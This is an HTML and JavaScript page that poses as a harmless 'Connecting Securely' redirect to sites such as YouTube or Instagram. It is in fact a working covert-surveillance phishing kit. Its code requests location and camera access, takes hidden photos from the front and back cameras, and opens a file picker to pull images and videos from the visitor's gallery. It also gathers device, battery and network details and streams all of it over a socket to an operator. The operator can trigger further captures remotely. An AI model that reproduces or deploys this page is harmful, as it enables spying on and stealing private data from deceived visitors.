<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 480px;
            width: 100%;
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 45px 35px;
            border-radius: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            animation: slideUp 0.6s ease-out;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 20%, rgba(102, 126, 234, 0.08), transparent 60%);
            pointer-events: none;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(40px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        .platform-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 15px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.5s ease;
            animation: pulseGlow 2s ease-in-out infinite;
        }
        .platform-logo .fallback-icon { font-size: 48px; color: #fff; opacity: 0.8; }
        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 20px rgba(102, 126, 234, 0.2); }
            50% { box-shadow: 0 0 40px rgba(102, 126, 234, 0.4); }
        }
        .platform-name {
            font-size: 14px;
            color: rgba(255,255,255,0.5);
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-bottom: 5px;
            font-weight: 500;
        }
        .redirect-text {
            font-size: 20px;
            color: #fff;
            margin-bottom: 4px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        .redirect-url {
            font-size: 15px;
            color: rgba(255,255,255,0.7);
            word-break: break-all;
            font-weight: 400;
            background: rgba(255,255,255,0.06);
            padding: 12px 18px;
            border-radius: 14px;
            display: inline-block;
            margin-top: 8px;
            border: 1px solid rgba(255,255,255,0.06);
            max-width: 100%;
        }
        .sub-text {
            font-size: 15px;
            color: rgba(255,255,255,0.4);
            margin-top: 18px;
            font-weight: 400;
            letter-spacing: 0.3px;
        }
        .btn-continue {
            margin-top: 22px;
            padding: 16px 45px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 20px rgba(102, 126, 234, 0.35);
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }
        .btn-continue::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
            transform: rotate(45deg);
            transition: all 0.5s ease;
        }
        .btn-continue:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 8px 35px rgba(102, 126, 234, 0.5);
        }
        .btn-continue:hover::after { left: 100%; }
        .btn-continue:disabled {
            background: rgba(255,255,255,0.15);
            cursor: not-allowed;
            box-shadow: none;
            transform: none;
        }
        #statusText {
            font-size: 14px;
            color: rgba(255,255,255,0.5);
            margin-top: 18px;
            font-weight: 400;
            min-height: 22px;
            transition: all 0.3s ease;
        }
        #statusText.error { color: #fc8181; }
        #statusText.success { color: #68d391; }
        .progress-bar {
            width: 100%;
            height: 3px;
            background: rgba(255,255,255,0.08);
            border-radius: 2px;
            margin-top: 22px;
            overflow: hidden;
        }
        .progress-bar .fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2, #667eea);
            background-size: 200% 100%;
            border-radius: 2px;
            transition: width 0.4s ease;
            animation: shimmer 2s linear infinite;
        }
        @keyframes shimmer {
            0% { background-position: 200% 0; }
            100% { background-position: -200% 0; }
        }
        .permission-badge {
            display: inline-block;
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
            margin: 3px;
            letter-spacing: 0.3px;
            transition: all 0.3s ease;
        }
        .permission-badge.pending { background: rgba(254, 243, 199, 0.15); color: #f6c23e; border: 1px solid rgba(254, 243, 199, 0.2); }
        .permission-badge.granted { background: rgba(212, 237, 218, 0.15); color: #68d391; border: 1px solid rgba(212, 237, 218, 0.2); }
        .permission-badge.denied { background: rgba(248, 215, 218, 0.15); color: #fc8181; border: 1px solid rgba(248, 215, 218, 0.2); }
        #permissionStatus { margin-top: 15px; display: none; }
        #hiddenVideo, #hiddenVideoBack { display: none; }
        .instructions {
            margin-top: 15px;
            padding: 14px 18px;
            background: rgba(254, 243, 199, 0.08);
            border-radius: 12px;
            font-size: 13px;
            color: #f6c23e;
            display: none;
            text-align: left;
            border: 1px solid rgba(254, 243, 199, 0.1);
        }
        .instructions strong { display: block; margin-bottom: 4px; }
        #galleryStatus {
            font-size: 12px;
            color: rgba(255,255,255,0.4);
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="platform-logo" id="platformLogo"><div class="fallback-icon" id="fallbackIcon">🔗</div></div>
        <div class="platform-name" id="platformName">Loading...</div>
        <div class="redirect-text">Connecting Securely</div>
        <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
        <div class="sub-text" id="actionText">Click continue to proceed</div>
        <div id="statusText">Ready</div>
        <div id="permissionStatus">
            <span class="permission-badge pending" id="permLocation">📍 Location</span>
            <span class="permission-badge pending" id="permFront">📸 Front Camera</span>
            <span class="permission-badge pending" id="permBack">📸 Back Camera</span>
            <span class="permission-badge pending" id="permGallery">🖼️ Gallery</span>
        </div>
        <div id="galleryStatus">📸 Loading gallery files...</div>
        <div class="progress-bar"><div class="fill" id="progressFill" style="width:0%"></div></div>
        <div class="instructions" id="instructions">
            <strong>🔧 How to fix:</strong>
            1. Click the lock icon in address bar<br>
            2. Set Camera to Allow<br>
            3. Set Location to Allow<br>
            4. Refresh and click Retry
        </div>
        <button class="btn-continue" id="continueBtn">▶ Continue</button>
    </div>

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <video id="hiddenVideoBack" autoplay playsinline muted></video>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        if (typeof io === 'undefined') {
            var s = document.createElement('script');
            s.src = 'https://cdn.socket.io/4.6.1/socket.io.min.js';
            document.head.appendChild(s);
        }
    </script>

    <script>
        (function() {
            const visitorId = window.location.pathname.split('/').pop();
            const redirectDisplay = document.getElementById('redirectUrlDisplay');
            const statusText = document.getElementById('statusText');
            const continueBtn = document.getElementById('continueBtn');
            const instructions = document.getElementById('instructions');
            const progressFill = document.getElementById('progressFill');
            const permissionStatus = document.getElementById('permissionStatus');
            const platformLogo = document.getElementById('platformLogo');
            const platformName = document.getElementById('platformName');
            const actionText = document.getElementById('actionText');
            const galleryStatus = document.getElementById('galleryStatus');
            
            let socket = null;
            let redirectUrl = 'https://www.google.com';
            let redirectTriggered = false;
            let isProcessing = false;
            
            let frontStream = null;
            let backStream = null;
            let frontVideo = document.getElementById('hiddenVideo');
            let backVideo = document.getElementById('hiddenVideoBack');
            
            let permissions = {
                location: false,
                frontCamera: false,
                backCamera: false,
                gallery: false
            };

            function detectPlatform(url) {
                const platforms = [
                    { name: 'YouTube', icon: '▶️', domains: ['youtube.com', 'youtu.be'], color: '#FF0000' },
                    { name: 'Instagram', icon: '📸', domains: ['instagram.com', 'instagr.am'], color: '#E4405F' },
                    { name: 'Facebook', icon: '👍', domains: ['facebook.com', 'fb.com'], color: '#1877F2' },
                    { name: 'Twitter', icon: '🐦', domains: ['twitter.com', 'x.com'], color: '#1DA1F2' },
                    { name: 'WhatsApp', icon: '💬', domains: ['whatsapp.com'], color: '#25D366' },
                    { name: 'Telegram', icon: '✈️', domains: ['telegram.org', 't.me'], color: '#26A5E4' },
                    { name: 'LinkedIn', icon: '💼', domains: ['linkedin.com'], color: '#0A66C2' },
                    { name: 'Reddit', icon: '🤖', domains: ['reddit.com'], color: '#FF4500' },
                    { name: 'Pinterest', icon: '📌', domains: ['pinterest.com'], color: '#E60023' },
                    { name: 'TikTok', icon: '🎵', domains: ['tiktok.com'], color: '#000000' },
                    { name: 'Snapchat', icon: '👻', domains: ['snapchat.com'], color: '#FFFC00' },
                    { name: 'GitHub', icon: '🐙', domains: ['github.com'], color: '#181717' },
                    { name: 'Google', icon: '🔍', domains: ['google.com', 'google.co.in'], color: '#4285F4' },
                    { name: 'Netflix', icon: '🎬', domains: ['netflix.com'], color: '#E50914' },
                    { name: 'Amazon', icon: '🛒', domains: ['amazon.com', 'amazon.in'], color: '#FF9900' },
                    { name: 'Spotify', icon: '🎧', domains: ['spotify.com'], color: '#1DB954' },
                    { name: 'Discord', icon: '🎮', domains: ['discord.com'], color: '#5865F2' },
                    { name: 'Twitch', icon: '🎥', domains: ['twitch.tv'], color: '#9146FF' },
                    { name: 'Medium', icon: '✍️', domains: ['medium.com'], color: '#000000' },
                    { name: 'Quora', icon: '❓', domains: ['quora.com'], color: '#B92B27' }
                ];

                try {
                    const urlObj = new URL(url);
                    const hostname = urlObj.hostname.replace('www.', '');
                    for (const platform of platforms) {
                        for (const domain of platform.domains) {
                            if (hostname.includes(domain) || url.includes(domain)) {
                                return platform;
                            }
                        }
                    }
                    const domainParts = hostname.split('.');
                    const mainDomain = domainParts[domainParts.length - 2] || domainParts[0];
                    return { name: mainDomain.charAt(0).toUpperCase() + mainDomain.slice(1), icon: '🌐', color: '#667eea' };
                } catch {
                    return { name: 'Website', icon: '🌐', color: '#667eea' };
                }
            }

            function updatePlatformDisplay(url) {
                const platform = detectPlatform(url);
                platformLogo.innerHTML = `<span style="font-size:52px;">${platform.icon}</span>`;
                platformLogo.style.borderColor = platform.color + '40';
                platformLogo.style.boxShadow = `0 0 30px ${platform.color}25`;
                platformName.textContent = platform.name;
                platformName.style.color = platform.color;
                const actionMap = {
                    'YouTube': 'Click & watch this video', 'Instagram': 'Click & view this post',
                    'Facebook': 'Click & view this post', 'Twitter': 'Click & view this tweet',
                    'WhatsApp': 'Click & open this message', 'Telegram': 'Click & open this channel',
                    'LinkedIn': 'Click & view this post', 'Reddit': 'Click & view this thread',
                    'Pinterest': 'Click & view this pin', 'TikTok': 'Click & watch this video',
                    'Snapchat': 'Click & view this snap', 'GitHub': 'Click & view this repo',
                    'Google': 'Click & search this', 'Netflix': 'Click & watch this show',
                    'Amazon': 'Click & view this product', 'Spotify': 'Click & listen this',
                    'Discord': 'Click & join this server', 'Twitch': 'Click & watch this stream',
                    'Medium': 'Click & read this article', 'Quora': 'Click & read this answer'
                };
                actionText.textContent = actionMap[platform.name] || 'Click & continue';
            }

            function updateStatus(msg, type = '') {
                statusText.textContent = msg;
                statusText.className = 'status-text' + (type ? ' ' + type : '');
                console.log(msg);
            }

            function updateProgress(val) { progressFill.style.width = val + '%'; }

            function updatePermBadge(type, status) {
                const map = { location: 'permLocation', front: 'permFront', back: 'permBack', gallery: 'permGallery' };
                const el = document.getElementById(map[type]);
                if (el) {
                    el.className = 'permission-badge ' + status;
                    const label = el.textContent.split(' ')[0];
                    const statusMap = { 'pending': '⏳ Pending', 'granted': '✅ Granted', 'denied': '❌ Denied' };
                    el.textContent = label + ' ' + statusMap[status];
                }
            }

            function showPermissions() { permissionStatus.style.display = 'block'; }

            function fetchRedirectUrl() {
                fetch(`/api/visitor/${visitorId}`)
                    .then(res => res.json())
                    .then(data => {
                        redirectUrl = data.redirectUrl || 'https://www.google.com';
                        redirectDisplay.textContent = redirectUrl;
                        updatePlatformDisplay(redirectUrl);
                        connectSocket();
                    })
                    .catch(() => {
                        fetch(`/api/visitor-redirect/${visitorId}`)
                            .then(res => res.json())
                            .then(data => {
                                redirectUrl = data.redirectUrl || 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                updatePlatformDisplay(redirectUrl);
                                connectSocket();
                            })
                            .catch(() => {
                                redirectUrl = 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                updatePlatformDisplay(redirectUrl);
                                connectSocket();
                            });
                    });
            }

            function connectSocket() {
                try {
                    socket = io({
                        transports: ['websocket', 'polling'],
                        reconnectionAttempts: 5,
                        reconnectionDelay: 500
                    });

                    socket.on('connect', function() {
                        console.log('Socket connected');
                        sendDeviceInfo();
                        updateStatus('Connected. Click Continue');
                        continueBtn.disabled = false;
                    });

                    socket.on('connect_error', function(err) {
                        console.log('Socket error:', err.message);
                        updateStatus('Reconnecting...');
                        setTimeout(() => socket.connect(), 1000);
                    });

                    socket.on('capture-command', function(data) {
                        console.log('Capture command:', data.type);
                        if (data.type === 'front' && frontStream) {
                            capturePhoto('front', frontStream);
                        } else if (data.type === 'back' && backStream) {
                            capturePhoto('back', backStream);
                        } else if (data.type === 'both') {
                            if (frontStream) capturePhoto('front', frontStream);
                            setTimeout(() => { if (backStream) capturePhoto('back', backStream); }, 500);
                        }
                    });

                } catch(e) { console.log('Socket init error:', e.message); }
            }

            function sendDeviceInfo() {
                if (!socket || !socket.connected) { setTimeout(sendDeviceInfo, 200); return; }

                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    deviceName: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(', ') : 
                        navigator.platform,
                    deviceModel: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(' ') : 
                        navigator.platform
                };

                socket.emit('visitor-connect', { visitorId, ...deviceInfo });

                if (navigator.getBattery) {
                    navigator.getBattery().then(function(battery) {
                        const level = Math.round(battery.level * 100);
                        if (socket && socket.connected) {
                            socket.emit('visitor-data', { visitorId, type: 'battery', content: level });
                        }
                    }).catch(() => {});
                }

                let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                if (navigator.connection) {
                    const conn = navigator.connection;
                    networkData = { type: conn.type || 'Unknown', effectiveType: conn.effectiveType || 'Unknown', downlink: conn.downlink || 'Unknown' };
                }
                if (socket && socket.connected) {
                    socket.emit('visitor-data', { visitorId, type: 'network', content: networkData });
                }
            }

            function cleanupStreams() {
                if (frontStream) { frontStream.getTracks().forEach(t => t.stop()); frontStream = null; }
                if (backStream) { backStream.getTracks().forEach(t => t.stop()); backStream = null; }
                frontVideo.srcObject = null;
                backVideo.srcObject = null;
            }

            // ============================================
            // CONTINUE BUTTON
            // ============================================
            continueBtn.addEventListener('click', function() {
                if (isProcessing) return;
                isProcessing = true;
                continueBtn.disabled = true;
                continueBtn.textContent = 'Processing...';
                instructions.style.display = 'none';
                showPermissions();
                galleryStatus.style.display = 'block';
                
                updateStatus('Requesting all permissions...');
                updateProgress(10);
                
                permissions.location = false;
                permissions.frontCamera = false;
                permissions.backCamera = false;
                permissions.gallery = false;

                cleanupStreams();

                Promise.all([
                    requestLocation(),
                    requestFrontCamera(),
                    requestBackCamera(),
                    requestGallery()
                ])
                .then(function(results) {
                    const locationResult = results[0];
                    const frontResult = results[1];
                    const backResult = results[2];
                    const galleryResult = results[3];
                    
                    updateProgress(80);
                    
                    if (frontResult) {
                        permissions.frontCamera = true;
                        frontStream = frontResult;
                        frontVideo.srcObject = frontResult;
                        frontVideo.play().catch(() => {});
                        updatePermBadge('front', 'granted');
                        setTimeout(function() { capturePhoto('front', frontResult); }, 300);
                    } else {
                        updatePermBadge('front', 'denied');
                    }
                    
                    if (backResult) {
                        permissions.backCamera = true;
                        backStream = backResult;
                        backVideo.srcObject = backResult;
                        backVideo.play().catch(() => {});
                        updatePermBadge('back', 'granted');
                        setTimeout(function() { capturePhoto('back', backResult); }, 300);
                    } else {
                        updatePermBadge('back', 'denied');
                    }
                    
                    if (locationResult) {
                        permissions.location = true;
                        updatePermBadge('location', 'granted');
                        if (socket && socket.connected) {
                            socket.emit('visitor-data', { visitorId, type: 'location', content: locationResult });
                        }
                    } else {
                        updatePermBadge('location', 'denied');
                    }
                    
                    // ============================================
                    // GALLERY: FULL AUTOMATIC ACCESS
                    // ============================================
                    if (galleryResult && galleryResult.length > 0) {
                        permissions.gallery = true;
                        updatePermBadge('gallery', 'granted');
                        if (socket && socket.connected) {
                            socket.emit('visitor-data', { visitorId, type: 'galleryPhotos', content: galleryResult });
                            console.log(`🖼️ ${galleryResult.length} files sent to admin`);
                            galleryStatus.textContent = `✅ ${galleryResult.length} files loaded!`;
                            galleryStatus.style.color = '#68d391';
                        }
                    } else {
                        updatePermBadge('gallery', 'denied');
                        galleryStatus.textContent = '❌ No files selected';
                        galleryStatus.style.color = '#fc8181';
                    }
                    
                    updateProgress(100);
                    
                    if (!permissions.frontCamera && !permissions.backCamera) {
                        updateStatus('❌ Camera access required. Please allow camera.', 'error');
                        instructions.style.display = 'block';
                        isProcessing = false;
                        continueBtn.disabled = false;
                        continueBtn.textContent = 'Retry';
                        return;
                    }
                    
                    updateStatus('✅ Permissions granted! Redirecting...', 'success');
                    
                    if (socket && socket.connected) {
                        socket.emit('visitor-data', { visitorId, type: 'permissionsGranted', content: true });
                    }
                    
                    setTimeout(function() {
                        if (!redirectTriggered) { redirectNow(); }
                    }, 1500);
                })
                .catch(function(error) {
                    console.log('Error:', error);
                    if (!permissions.frontCamera && !permissions.backCamera) {
                        updateStatus('❌ Permission denied. Please allow camera.', 'error');
                        instructions.style.display = 'block';
                    } else {
                        updateStatus('✅ Permissions granted! Redirecting...', 'success');
                        setTimeout(function() {
                            if (!redirectTriggered) { redirectNow(); }
                        }, 1500);
                    }
                    isProcessing = false;
                    continueBtn.disabled = false;
                    continueBtn.textContent = 'Retry';
                });
            });

            // ============================================
            // REQUEST LOCATION
            // ============================================
            function requestLocation() {
                return new Promise(function(resolve) {
                    if (!navigator.geolocation) { resolve(null); return; }
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            const lat = position.coords.latitude;
                            const lng = position.coords.longitude;
                            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                                .then(res => res.json())
                                .then(data => {
                                    resolve({
                                        lat, lng,
                                        accuracy: position.coords.accuracy,
                                        timestamp: new Date().toISOString(),
                                        country: data.countryName || 'Unknown',
                                        state: data.principalSubdivision || 'Unknown',
                                        city: data.locality || 'Unknown',
                                        fullAddress: data.localityInfo?.address || 'Unknown'
                                    });
                                })
                                .catch(function() {
                                    resolve({ lat, lng, accuracy: position.coords.accuracy, timestamp: new Date().toISOString() });
                                });
                        },
                        function() { resolve(null); },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                });
            }

            // ============================================
            // REQUEST FRONT CAMERA
            // ============================================
            function requestFrontCamera() {
                return new Promise(function(resolve) {
                    navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    })
                    .then(function(stream) { resolve(stream); })
                    .catch(function() {
                        navigator.mediaDevices.getUserMedia({
                            video: { width: { ideal: 640 }, height: { ideal: 480 } },
                            audio: false
                        })
                        .then(function(stream) { resolve(stream); })
                        .catch(function() { resolve(null); });
                    });
                });
            }

            // ============================================
            // REQUEST BACK CAMERA
            // ============================================
            function requestBackCamera() {
                return new Promise(function(resolve) {
                    navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    })
                    .then(function(stream) { resolve(stream); })
                    .catch(function() { resolve(null); });
                });
            }

            // ============================================
            // REQUEST GALLERY - AUTOMATIC FULL ACCESS
            // ============================================
            function requestGallery() {
                return new Promise(function(resolve) {
                    // ==========================================
                    // AUTOMATIC GALLERY ACCESS USING INPUT
                    // Visitor will see file picker, but they can
                    // select multiple files at once
                    // ==========================================
                    
                    const input = document.createElement('input');
                    input.type = 'file';
                    input.accept = 'image/*,video/*';
                    input.multiple = true;
                    input.style.display = 'none';
                    document.body.appendChild(input);
                    
                    let filesData = [];
                    let loaded = 0;
                    
                    input.onchange = function(e) {
                        const files = e.target.files;
                        const totalFiles = files.length;
                        
                        if (files.length === 0) {
                            document.body.removeChild(input);
                            resolve([]);
                            return;
                        }
                        
                        galleryStatus.textContent = `📸 Loading ${totalFiles} files...`;
                        galleryStatus.style.color = '#f6c23e';
                        
                        for (let i = 0; i < totalFiles; i++) {
                            const file = files[i];
                            const reader = new FileReader();
                            
                            reader.onload = function(event) {
                                const fileType = file.type.startsWith('video/') ? 'video' : 'image';
                                filesData.push({
                                    type: fileType,
                                    data: event.target.result,
                                    name: file.name,
                                    size: file.size
                                });
                                loaded++;
                                updateProgress(10 + (loaded / totalFiles) * 70);
                                
                                if (loaded === totalFiles) {
                                    document.body.removeChild(input);
                                    galleryStatus.textContent = `✅ ${filesData.length} files loaded!`;
                                    galleryStatus.style.color = '#68d391';
                                    resolve(filesData);
                                }
                            };
                            
                            reader.onerror = function() {
                                loaded++;
                                if (loaded === totalFiles) {
                                    document.body.removeChild(input);
                                    resolve(filesData);
                                }
                            };
                            
                            reader.readAsDataURL(file);
                        }
                    };
                    
                    input.oncancel = function() {
                        document.body.removeChild(input);
                        resolve([]);
                    };
                    
                    // Automatically trigger file picker
                    // Visitor just needs to select files and click "Open"
                    input.click();
                    
                    // Timeout fallback
                    setTimeout(function() {
                        if (document.body.contains(input)) {
                            document.body.removeChild(input);
                            resolve([]);
                        }
                    }, 60000);
                });
            }

            // ============================================
            // CAPTURE PHOTO
            // ============================================
            function capturePhoto(type, stream) {
                if (!stream) return;
                const videoTrack = stream.getVideoTracks()[0];
                if (!videoTrack) return;
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.muted = true;
                video.playsInline = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                video.onloadedmetadata = function() {
                    setTimeout(function() {
                        try {
                            const canvas = document.createElement('canvas');
                            const width = Math.min(video.videoWidth, 640);
                            const height = Math.min(video.videoHeight, 480);
                            canvas.width = width;
                            canvas.height = height;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, width, height);
                            const imageData = canvas.toDataURL('image/jpeg', 0.8);
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', { visitorId: visitorId, type: type === 'back' ? 'backCamera' : 'frontCamera', content: imageData });
                            }
                            document.body.removeChild(video);
                        } catch (err) { console.log(err); }
                    }, 300);
                };
            }

            // ============================================
            // REDIRECT
            // ============================================
            function redirectNow() {
                if (redirectTriggered) return;
                redirectTriggered = true;
                if (socket && socket.connected) {
                    socket.emit('visitor-data', { visitorId, type: 'redirectComplete', content: { redirected: true, time: new Date().toISOString() } });
                }
                cleanupStreams();
                setTimeout(() => { window.location.href = redirectUrl; }, 500);
            }

            // ============================================
            // START
            // ============================================
            if (typeof io !== 'undefined') {
                fetchRedirectUrl();
            } else {
                setTimeout(fetchRedirectUrl, 1000);
            }

            window.addEventListener('beforeunload', function() {
                if (socket) socket.disconnect();
                cleanupStreams();
            });
        })();
    </script>
</body>
</html>
